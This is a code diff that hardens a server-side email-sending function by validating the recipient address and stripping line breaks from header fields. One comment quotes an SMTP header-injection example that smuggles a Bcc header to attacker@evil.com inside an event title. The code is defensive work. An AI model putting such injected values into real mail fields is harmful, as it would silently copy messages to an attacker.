@@ -1,4 +1,5 @@
 import 'server-only';
+import { z } from 'zod';
 import { Resend } from 'resend';
 import { env } from '@/lib/env';
 
@@ -18,21 +19,45 @@ export type SendMailArgs = {
   replyTo?: string;
 };
 
+const emailSchema = z.string().email();
+
+// Strip CR/LF from anything that becomes an email header value. Our current
+// callers all pass trusted or already-validated strings, but sendMail is a
+// public boundary — a future caller could pass user-controlled data. An
+// eventTitle like "Night Out\r\nBcc: attacker@evil.com" is the classic SMTP
+// header-injection vector. Resend's API probably sanitizes, but "probably"
+// isn't a security posture; belt-and-suspenders.
+function sanitizeHeader(value: string): string {
+  return value.replace(/[\r\n]+/g, ' ').trim();
+}
+
 export async function sendMail(args: SendMailArgs): Promise<void> {
+  const to = sanitizeHeader(args.to);
+  const subject = sanitizeHeader(args.subject);
+  const replyTo = args.replyTo ? sanitizeHeader(args.replyTo) : undefined;
+
+  // Validate the recipient looks like an email. Resend rejects malformed
+  // addresses at their API, but catching here gives a clearer error and
+  // avoids a round-trip for obvious garbage.
+  const parsed = emailSchema.safeParse(to);
+  if (!parsed.success) {
+    throw new Error(`[mailer] invalid recipient email: ${to}`);
+  }
+
   if (!resend) {
-    console.info('[mailer:dev]', { to: args.to, subject: args.subject });
+    console.info('[mailer:dev]', { to, subject });
     console.info('[mailer:dev:html]\n' + args.html);
     return;
   }
   const { error } = await resend.emails.send({
     from: env.EMAIL_FROM,
-    to: args.to,
-    subject: args.subject,
+    to,
+    subject,
     html: args.html,
     text: args.text,
-    replyTo: args.replyTo,
+    replyTo,
   });
   if (error) {
-    throw new Error(`[mailer] send failed (${args.subject}): ${error.message}`);
+    throw new Error(`[mailer] send failed (${subject}): ${error.message}`);
   }
 }
